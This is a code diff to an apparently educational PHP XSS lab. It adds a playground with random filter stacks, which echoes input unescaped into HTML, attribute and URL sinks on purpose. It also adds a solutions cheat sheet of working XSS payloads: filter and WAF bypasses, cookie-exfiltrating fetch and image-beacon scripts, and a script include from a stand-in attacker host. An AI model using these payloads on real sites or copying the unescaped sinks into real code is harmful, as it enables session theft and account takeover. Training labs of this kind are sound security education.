@@ -178,8 +178,10 @@ function header_html($title='XSS Lab', $active='home'){
         'filter'=>'Filter lab',
         'contexts'=>'Contexts explorer',
         'playground'=>'Practice playground',
+        'random'=>'Random rules playground',
         'waf'=>'WAF bypass lab',
-        'bypasses'=>'Bypass library'
+        'bypasses'=>'Bypass library',
+        'solutions'=>'Solutions cheat sheet'
     ];
     foreach ($tabs as $k=>$v){
         $classes = 'nav-item button';
@@ -229,8 +231,10 @@ if ($page === 'home'){
         ['filter','Filter Lab','Experiment with increasingly strict server-side filters and learn reliable bypasses.'],
         ['contexts','Contexts','See how the same payload behaves in HTML, attributes, JS, CSS and URL contexts.'],
         ['playground','Playground','Apply everything you learned across multiple realistic mini applications.'],
+        ['random','Random rules','Face unpredictable filter stacks and practise reverse-engineering the rules.'],
         ['waf','WAF bypass lab','Drill WAF evasion strategies across multiple inspection levels with guided lectures.'],
         ['bypasses','Bypasses','Browse a curated list of payloads ranked from beginner friendly to advanced evasions.'],
+        ['solutions','Solutions cheat sheet','Review solved payloads for every lab when you get stuck or want to verify progress.'],
     ];
     foreach ($cards as $card){
         echo '<a class="lab-card" href="#" data-page="'.htmlspecialchars($card[0]).'"><div class="lab-card-title">'.htmlspecialchars($card[1]).'</div><div class="lab-card-body small">'.$card[2].'</div><div class="lab-card-action">Start lab →</div></a>';
@@ -1289,6 +1293,466 @@ if ($page === 'contexts'){
     echo '<div><div class="analysis-label">CSS</div><div class="results"><div style="width:100%;height:30px;'.htmlspecialchars($c).'">Box</div></div><div class="context-note small">Some browsers execute JavaScript via CSS expressions in legacy modes.</div></div>';
     echo '</div>';
     echo '</div>';
+    footer_html();
+    exit;
+}
+
+if ($page === 'random'){
+    header_html('Random rules playground', 'random');
+    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Every visit loads a new filter stack. Reverse engineer the rules, adapt your payload and record the bypass for future engagements.</div></div>';
+    xp_marker('random-rules-cracked', 'Solved a random rules challenge', 35);
+
+    $filterTitles = [
+        'none' => 'No filter',
+        'naive' => 'Naive script scrub',
+        'strip_tags' => 'Tag stripper',
+        'strip_attributes' => 'Attribute scrubber',
+        'tag_whitelist' => 'Formatting whitelist',
+        'encode' => 'HTML encoder',
+        'double_encode' => 'Double encoder',
+        'regex' => 'Regex filter',
+        'json_escape' => 'JSON escaper'
+    ];
+
+    $filterSummaries = [
+        'none' => 'Nothing is removed server-side—expect the payload to arrive intact.',
+        'naive' => 'Removes <script> tags and obvious on* handlers but misses creative spacing.',
+        'strip_tags' => 'Drops any disallowed tags entirely, leaving their text content behind.',
+        'strip_attributes' => 'Scrubs inline event handlers plus style/srcdoc/xlink attributes.',
+        'tag_whitelist' => 'Only allows simple markup such as <a>, <div>, <span>, and code formatting.',
+        'encode' => 'Encodes HTML entities so output renders as text.',
+        'double_encode' => 'Encodes entities twice—look for double-decoding sinks.',
+        'regex' => 'Regex removes angle brackets and javascript: prefixes.',
+        'json_escape' => 'Escapes characters so the payload can sit safely inside JSON.'
+    ];
+
+    $wafTitles = [
+        'basic' => 'Basic keyword firewall',
+        'balanced' => 'Balanced behavioural firewall',
+        'paranoid' => 'Paranoid inspection firewall'
+    ];
+
+    $wafSummaries = [
+        'basic' => 'Blocks classic <script>, javascript: URLs and obvious inline handlers.',
+        'balanced' => 'Flags DOM API keywords and rewrites <img>, <svg> or <iframe> tags.',
+        'paranoid' => 'Rejects requests containing angle brackets or suspicious keywords outright.'
+    ];
+
+    $contextSummaries = [
+        'html' => 'Payload is injected straight into an HTML results block.',
+        'attribute' => 'Payload is appended to a call-to-action element\'s attribute list.',
+        'url' => 'Payload becomes the href of a generated link.'
+    ];
+
+    $challengeLibrary = [
+        'helpdesk_naive' => [
+            'title' => 'Helpdesk search highlight',
+            'scenario' => 'The helpdesk portal echoes your search term inside a results summary card without much validation.',
+            'filters' => ['naive'],
+            'context' => 'html',
+            'clues' => [
+                'Direct <script> tags vanish but other HTML remains untouched.',
+                'Whitespace inside handler names can confuse the regex—think about newline injections.'
+            ],
+            'goal' => 'Make the results block execute arbitrary JavaScript.'
+        ],
+        'profile_badge' => [
+            'title' => 'Profile badge customiser',
+            'scenario' => 'Marketing updates the CTA badge label that lands inside a button attribute.',
+            'filters' => ['strip_attributes'],
+            'context' => 'attribute',
+            'clues' => [
+                'Any attribute that starts with on... is removed.',
+                'Quotes survive unchanged—close the attribute and inject new markup.'
+            ],
+            'goal' => 'Trigger execution when the badge renders.'
+        ],
+        'newsletter_link' => [
+            'title' => 'Newsletter CTA link',
+            'scenario' => 'A newsletter composer stores whatever you provide inside an <a> tag for later rendering.',
+            'filters' => ['tag_whitelist'],
+            'context' => 'url',
+            'clues' => [
+                'Only simple formatting tags survive, but anchors keep their href attribute.',
+                'Inline handlers disappear, so lean on special URL protocols instead.'
+            ],
+            'goal' => 'Turn the generated link into code execution.'
+        ],
+        'status_banner' => [
+            'title' => 'Status banner hero',
+            'scenario' => 'Operations writes copy that feeds a hero button. Two passes strip risky tags and attributes.',
+            'filters' => ['tag_whitelist', 'strip_attributes'],
+            'context' => 'attribute',
+            'clues' => [
+                'Formatting markup is preserved but inline event handlers are removed.',
+                'Attributes such as href remain—escape the attribute or use alternative protocols.'
+            ],
+            'goal' => 'Deliver JavaScript execution via the banner button.'
+        ],
+        'insider_widget' => [
+            'title' => 'Insider analytics widget',
+            'scenario' => 'Analysts can tweak the HTML of a dashboard widget guarded by a multi-stage scrub and a behavioural WAF.',
+            'filters' => ['naive', 'tag_whitelist'],
+            'waf' => 'balanced',
+            'context' => 'html',
+            'clues' => [
+                'The server removes <script> tags and only allows simple layout tags afterwards.',
+                'The WAF rewrites <img>, <svg> and <iframe> tags—consider other vectors.'
+            ],
+            'goal' => 'Find a payload that still executes inside the widget.'
+        ]
+    ];
+
+    $challengeKeys = array_keys($challengeLibrary);
+    $requestedChallenge = $_GET['challenge'] ?? '';
+    if (isset($_GET['reroll'])){
+        $requestedChallenge = '';
+    }
+    if (!$requestedChallenge || !isset($challengeLibrary[$requestedChallenge])){
+        $requestedChallenge = $challengeKeys[random_int(0, count($challengeKeys) - 1)];
+    }
+    $challenge = $challengeLibrary[$requestedChallenge];
+    $activeFilters = $challenge['filters'];
+    $activeWaf = $challenge['waf'] ?? null;
+    $intelItems = [];
+    foreach ($activeFilters as $filterName){
+        $title = $filterTitles[$filterName] ?? ucfirst(str_replace('_', ' ', $filterName));
+        $summary = $filterSummaries[$filterName] ?? 'No notes recorded for this filter.';
+        $intelItems[] = '<span class="random-filter-name">'.htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</span> — '.htmlspecialchars($summary, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+    }
+    if ($activeWaf){
+        $title = $wafTitles[$activeWaf] ?? ucfirst($activeWaf);
+        $summary = $wafSummaries[$activeWaf] ?? 'Firewall behaviour is unknown—probe carefully.';
+        $intelItems[] = '<span class="random-filter-name">'.htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</span> — '.htmlspecialchars($summary, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+    }
+
+    echo '<div class="section"><div class="section-title">Current challenge</div><div class="small">Scenario: '.htmlspecialchars($challenge['scenario'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div></div>';
+    echo '<div class="meta meta-columns random-meta">';
+    echo '<div><strong>Filter intel</strong><ul class="lab-list">';
+    foreach ($intelItems as $item){
+        echo '<li>'.$item.'</li>';
+    }
+    echo '</ul></div>';
+    echo '<div><strong>Clues from the SOC</strong><ul class="lab-list">';
+    foreach ($challenge['clues'] as $clue){
+        echo '<li>'.htmlspecialchars($clue, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</li>';
+    }
+    echo '</ul></div>';
+    echo '<div><strong>Target profile</strong><div class="small">'.htmlspecialchars($contextSummaries[$challenge['context']] ?? 'Unknown context.', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div><div class="callout small">Goal: '.htmlspecialchars($challenge['goal'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div><div class="small">Share this challenge via <code>?page=random&amp;challenge='.htmlspecialchars($requestedChallenge, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</code>.</div></div>';
+    echo '</div>';
+
+    tip_vault('tips-random', 10, 'Random rules tactics', [
+        [
+            'title' => 'Probe the surface',
+            'items' => [
+                'Start with harmless strings (<code>test</code>, <code>&lt;b&gt;probe&lt;/b&gt;</code>) to observe mutations before committing to a payload.',
+                'Compare the rendered result and the filter trail to deduce which characters are stripped or encoded.'
+            ]
+        ],
+        [
+            'title' => 'Log every bypass',
+            'items' => [
+                'Copy successful payloads and their filter stack into your notes—you will see these combinations again.',
+                'Record how you evaded each rule so you can adapt quickly when the stack changes.'
+            ]
+        ],
+        [
+            'title' => 'Escalate carefully',
+            'items' => [
+                'Once you learn which characters survive, escalate to payloads that close the context and introduce script execution.',
+                'Remember to test protocol-based payloads (<code>javascript:</code>, <code>data:</code>) when event handlers disappear.'
+            ]
+        ]
+    ]);
+
+    $submitted = $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payload']);
+    $payload = $submitted ? ($_POST['payload'] ?? '') : '';
+    $filtered = $payload;
+    $steps = [];
+    $wafInfo = null;
+    $wafBlocked = false;
+    if ($submitted){
+        foreach ($activeFilters as $filterName){
+            $before = $filtered;
+            $filtered = filter_input_level($filtered, $filterName);
+            $label = 'Filter — '.($filterTitles[$filterName] ?? ucfirst(str_replace('_', ' ', $filterName)));
+            $steps[] = [
+                'label' => $label,
+                'before' => $before,
+                'after' => $filtered,
+                'changed' => $before !== $filtered
+            ];
+        }
+        if ($activeWaf){
+            $before = $filtered;
+            $wafInfo = waf_process($filtered, $activeWaf);
+            $filtered = $wafInfo['transformed'];
+            $label = 'Firewall — '.($wafTitles[$activeWaf] ?? ucfirst($activeWaf));
+            $steps[] = [
+                'label' => $label,
+                'before' => $before,
+                'after' => $filtered,
+                'changed' => $before !== $filtered,
+                'blocked' => !$wafInfo['allowed'],
+                'reason' => $wafInfo['reason'],
+                'triggers' => $wafInfo['triggers']
+            ];
+            if (!$wafInfo['allowed']){
+                $wafBlocked = true;
+            }
+        }
+    }
+
+    echo '<form method="POST" action="?page=random&amp;challenge='.htmlspecialchars($requestedChallenge, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'">';
+    echo '<input type="hidden" name="challenge" value="'.htmlspecialchars($requestedChallenge, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'">';
+    echo '<div class="form-row"><textarea class="input" name="payload" rows="3" placeholder="Craft your payload">'.htmlspecialchars($payload, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Payloads persist per challenge—iterate quickly.</span></div>';
+    echo '<div class="form-row"><button class="button">Test payload</button><a class="button button-secondary" href="?page=random&amp;reroll=1">Roll another challenge</a></div>';
+    echo '</form>';
+
+    if ($submitted){
+        echo '<div class="section"><div class="section-title">Filter trail</div><div class="small">Track how your payload changed as it travelled through the stack.</div>';
+        echo '<div class="results"><div class="results-body">';
+        echo '<table class="random-step-table"><thead><tr><th>Stage</th><th>Input before stage</th><th>Output after stage</th></tr></thead><tbody>';
+        foreach ($steps as $step){
+            $rowClasses = [];
+            if (empty($step['changed'])){
+                $rowClasses[] = 'is-unchanged';
+            }
+            if (!empty($step['blocked'])){
+                $rowClasses[] = 'is-blocked';
+            }
+            $rowClassAttr = $rowClasses ? ' class="'.implode(' ', $rowClasses).'"' : '';
+            echo '<tr'.$rowClassAttr.'>';
+            echo '<td><div class="random-step-label">'.htmlspecialchars($step['label'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div>';
+            if (!empty($step['blocked'])){
+                echo '<div class="random-step-status">Blocked: '.htmlspecialchars($step['reason'] ?? 'Unknown reason', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div>';
+            } elseif (!empty($step['changed'])){
+                echo '<div class="random-step-status">Payload mutated at this stage.</div>';
+            } else {
+                echo '<div class="random-step-status">No changes detected.</div>';
+            }
+            if (!empty($step['triggers'])){
+                echo '<div class="random-step-status">Triggers: '.htmlspecialchars(implode(', ', $step['triggers']), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div>';
+            }
+            echo '</td>';
+            $beforeDisplay = htmlspecialchars($step['before'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+            $afterDisplay = htmlspecialchars($step['after'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+            echo '<td><pre>'.$beforeDisplay.'</pre></td>';
+            echo '<td><pre>'.$afterDisplay.'</pre></td>';
+            echo '</tr>';
+        }
+        echo '</tbody></table>';
+        echo '</div></div></div>';
+
+        echo '<div class="section"><div class="section-title">Rendered sink</div>';
+        if ($wafBlocked){
+            echo '<div class="callout is-danger">The firewall blocked the payload: '.htmlspecialchars($wafInfo['reason'] ?? 'Unknown reason', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div>';
+        } else {
+            if ($challenge['context'] === 'attribute'){
+                echo '<div class="results"><div class="results-title">CTA button preview</div><div class="results-body"><button class="button" id="random-attr-target" '.$filtered.'>Hover or click me</button><div class="small">Inspect the button attributes to confirm where your payload landed.</div></div></div>';
+            } elseif ($challenge['context'] === 'url'){
+                echo '<div class="results"><div class="results-title">Generated hyperlink</div><div class="results-body"><a class="button" id="random-link-target" href="'.$filtered.'">Open campaign link</a><div class="small">Clicking this link follows whatever protocol survived the filters.</div></div></div>';
+            } else {
+                echo '<div class="results"><div class="results-title">Widget output</div><div class="results-body">'.$filtered.'</div></div>';
+            }
+        }
+        $finalPreview = htmlspecialchars($filtered, ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+        echo '<div class="meta"><strong>Final string after all filters</strong><div class="small"><code>'.$finalPreview.'</code></div></div>';
+        echo '</div>';
+    }
+
+    footer_html();
+    exit;
+}
+
+if ($page === 'solutions'){
+    header_html('Solutions cheat sheet', 'solutions');
+    echo '<div class="section"><div class="section-title">Consolidated answers</div><div class="small">Use this cheat sheet after attempting each lab. It summarises the key exploitation flow and provides a proven payload so you can confirm your understanding before moving on.</div></div>';
+    xp_marker('solutions-review', 'Reviewed the solutions cheat sheet', 15);
+
+    $coreLabs = [
+        [
+            'title' => 'Foundations & concepts',
+            'summary' => 'Validate you can trace HTML → DOM → JavaScript interactions.',
+            'steps' => [
+                'Recreate the sample outline from the lab inside DevTools to ensure the DOM structure matches the diagram.',
+                'Toggle individual nodes in the Elements panel and observe the impact on layout—this mirrors the DOM mutations used in later labs.'
+            ],
+            'payloads' => []
+        ],
+        [
+            'title' => 'Reflected XSS',
+            'summary' => 'The <code>q</code> parameter is injected straight into the response body.',
+            'steps' => [
+                'Load <code>?page=reflected&amp;q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> to prove execution.',
+                "Swap the alert for <code>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</code> to demonstrate data theft."
+            ],
+            'payloads' => [
+                ['code' => "<img src=x onerror=alert('reflected')>", 'note' => 'Fires immediately because attributes are not sanitised.']
+            ]
+        ],
+        [
+            'title' => 'Stored XSS',
+            'summary' => 'Messages are saved to SQLite and rendered without escaping.',
+            'steps' => [
+                'Submit any entry, refresh, and confirm it persists—then escalate to a script payload.',
+                "Store a callback that exfiltrates cookies to validate impact on subsequent visitors."
+            ],
+            'payloads' => [
+                ['code' => "<script>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</script>", 'note' => 'Executes for every visitor to the wall feed.']
+            ]
+        ],
+        [
+            'title' => 'DOM XSS',
+            'summary' => 'The inline script decodes <code>location.hash</code> into <code>innerHTML</code>.',
+            'steps' => [
+                'Set the hash to <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E</code> using the control or URL bar.',
+                'Watch <code>render()</code> rewrite the sink with your payload.'
+            ],
+            'payloads' => [
+                ['code' => "#%3Cimg%20src%3Dx%20onerror%3Dalert('DOM')%3E", 'note' => 'URL-encode the payload because the script decodes before assignment.']
+            ]
+        ],
+        [
+            'title' => 'Blind XSS',
+            'summary' => 'Execution is confirmed via the blind logger endpoint.',
+            'steps' => [
+                'Deliver a payload that issues a request to <code>/blind_logger.php</code>.',
+                'Monitor the Recent hits section for your identifier.'
+            ],
+            'payloads' => [
+                ['code' => "<script>new Image().src='/blind_logger.php?p='+encodeURIComponent(document.cookie)</script>", 'note' => 'Works even if fetch is blocked—Image beacons are simple and reliable.']
+            ]
+        ]
+    ];
+
+    echo '<div class="section"><div class="section-title">Core labs</div><div class="small">Confirm each foundational lesson before progressing.</div></div>';
+    echo '<div class="meta">';
+    foreach ($coreLabs as $lab){
+        echo '<div class="meta-item">';
+        echo '<strong>'.htmlspecialchars($lab['title'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</strong>';
+        if (!empty($lab['summary'])){
+            echo '<div class="small">'.$lab['summary'].'</div>';
+        }
+        if (!empty($lab['steps'])){
+            echo '<ol class="lab-steps">';
+            foreach ($lab['steps'] as $step){
+                echo '<li>'.$step.'</li>';
+            }
+            echo '</ol>';
+        }
+        if (!empty($lab['payloads'])){
+            echo '<ul class="lab-list">';
+            foreach ($lab['payloads'] as $payload){
+                $code = htmlspecialchars($payload['code'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                $note = htmlspecialchars($payload['note'] ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                echo '<li><code>'.$code.'</code>';
+                if ($note !== ''){
+                    echo ' — '.$note;
+                }
+                echo '</li>';
+            }
+            echo '</ul>';
+        }
+        echo '</div>';
+    }
+    echo '</div>';
+
+    $advancedLabs = [
+        [
+            'title' => 'Filter lab',
+            'summary' => 'Each level tweaks the server-side sanitiser. These payloads land reliable wins.',
+            'payloads' => [
+                ['code' => '<script>alert(1)</script>', 'note' => 'Level: none. Baseline reflection.'],
+                ['code' => '<svg/onload=alert(1)>', 'note' => 'Level: naive. SVG tags survive the strip.'],
+                ['code' => '<img src=x onerror=alert(1)>', 'note' => 'Level: strip_tags. Attributes remain intact.'],
+                ['code' => '" autofocus onfocus=alert(1) x="', 'note' => 'Level: strip_attributes. Breaks out via attribute injection.'],
+                ['code' => '<svg><animate onbegin=alert(1) attributeName=x></svg>', 'note' => 'Level: tag_whitelist. Uses permitted SVG with an event handler.'],
+                ['code' => 'javascript:alert(1)', 'note' => 'Level: regex. Protocol bypass once angle brackets are stripped.'],
+                ['code' => '</script><script>alert(1)</script>', 'note' => 'Level: encode and double_encode. Requires decoding chain before rendering.']
+            ]
+        ],
+        [
+            'title' => 'Contexts explorer',
+            'summary' => 'One payload to observe behaviour across HTML, attribute, JS, URL and CSS contexts.',
+            'steps' => [
+                "Input <code>'&quot;)&lt;svg/onload=alert(1)&gt;</code> and watch which contexts execute.",
+                'Adjust escaping per context—for example prepend <code>javascript:</code> for the URL tab.'
+            ],
+            'payloads' => []
+        ],
+        [
+            'title' => 'Practice playground',
+            'summary' => 'Key winning payloads for each of the thirteen scenarios.',
+            'payloads' => [
+                ['code' => '<img src=x onerror=alert("S1")>', 'note' => 'Scenario 1 — reflected search results.'],
+                ['code' => "<script>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</script>", 'note' => 'Scenario 2 — stored shoutbox.'],
+                ['code' => "localStorage.setItem('dashboard_widget', encodeURIComponent('<img src=x onerror=alert('S3')>'))", 'note' => 'Scenario 3 — execute via stored widget preference (run in the console).'],
+                ['code' => '" onmouseover=alert("S4") x="', 'note' => 'Scenario 4 — break out of the badge attribute.'],
+                ['code' => '";alert("S5");//', 'note' => 'Scenario 5 — terminate inline script string.'],
+                ['code' => '<svg/onload=alert("S6")>', 'note' => 'Scenario 6 — naive Markdown filter bypass.'],
+                ['code' => '%3Cscript%3Ealert("S7")%3C/script%3E', 'note' => 'Scenario 7 — double-decoded transcript message (URL-encode twice).'],
+                ['code' => '%3Cimg%20src%3Dx%20onerror%3Dalert("S8")%3E', 'note' => 'Scenario 8 — widget query parameter.'],
+                ['code' => '"};alert("S9");//', 'note' => 'Scenario 9 — close the analytics config string.'],
+                ['code' => 'background:url(javascript:alert("S10"))', 'note' => 'Scenario 10 — CSS url() injection.'],
+                ['code' => '&lt;img src=x onerror=alert("S11")&gt;', 'note' => 'Scenario 11 — entity-decoded email template payload.'],
+                ['code' => '#%3Cimg%20src%3Dx%20onerror%3Dalert("S12")%3E', 'note' => 'Scenario 12 — hash router innerHTML sink.'],
+                ['code' => '${alert("S13")}', 'note' => 'Scenario 13 — template literal injection.']
+            ]
+        ],
+        [
+            'title' => 'WAF bypass lab',
+            'summary' => 'Payloads that solve each inspection level.',
+            'payloads' => [
+                ['code' => '<svg/onload=alert(1)>', 'note' => 'Level: basic. Avoids the script keyword.'],
+                ['code' => '<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"></iframe>', 'note' => 'Level: balanced. Encodes risky tags then rehydrates client-side.'],
+                ['code' => '&#x3C;img src=x onerror=alert(1)>', 'note' => 'Level: paranoid. Uses HTML entities to sneak past bracket matching.']
+            ]
+        ],
+        [
+            'title' => 'Bypass library',
+            'summary' => 'Go-to entries when you need a fast starting payload.',
+            'payloads' => [
+                ['code' => '<script src=//evil.test/xss.js></script>', 'note' => 'External script include for wide support.'],
+                ['code' => '<math href=x onmouseover=alert(1)>', 'note' => 'Less common tag that survives simplistic filters.'],
+                ['code' => '<svg><a xlink:href="javascript:alert(1)">click</a></svg>', 'note' => 'Demonstrates protocol tricks using SVG namespaces.']
+            ]
+        ]
+    ];
+
+    echo '<div class="section"><div class="section-title">Advanced labs</div><div class="small">When the fundamentals click, use these to fast-track verification.</div></div>';
+    echo '<div class="meta">';
+    foreach ($advancedLabs as $lab){
+        echo '<div class="meta-item">';
+        echo '<strong>'.htmlspecialchars($lab['title'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</strong>';
+        if (!empty($lab['summary'])){
+            echo '<div class="small">'.$lab['summary'].'</div>';
+        }
+        if (!empty($lab['steps'])){
+            echo '<ol class="lab-steps">';
+            foreach ($lab['steps'] as $step){
+                echo '<li>'.$step.'</li>';
+            }
+            echo '</ol>';
+        }
+        if (!empty($lab['payloads'])){
+            echo '<ul class="lab-list">';
+            foreach ($lab['payloads'] as $payload){
+                $code = htmlspecialchars($payload['code'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                $note = htmlspecialchars($payload['note'] ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                echo '<li><code>'.$code.'</code>';
+                if ($note !== ''){
+                    echo ' — '.$note;
+                }
+                echo '</li>';
+            }
+            echo '</ul>';
+        }
+        echo '</div>';
+    }
+    echo '</div>';
+
+    echo '<div class="section"><div class="section-title">Keep iterating</div><div class="small">Treat these answers as verification, not a shortcut. Once you reproduce them, customise the payloads to explore additional impact such as credential theft, DOM scraping, or chained bypasses.</div></div>';
     footer_html();
     exit;
 }
